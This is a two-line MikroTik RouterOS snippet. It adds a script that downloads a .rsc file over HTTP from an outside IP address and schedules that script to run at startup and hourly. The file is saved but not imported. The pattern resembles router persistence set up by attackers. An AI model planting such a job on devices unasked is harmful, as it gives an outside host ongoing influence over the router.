/system script add name=upd policy=read,write,test source="/tool fetch url=http://198.51.100.7/u.rsc mode=http dst-path=u.rsc"
/system scheduler add name=upd interval=1h start-time=startup on-event="/system script run upd"
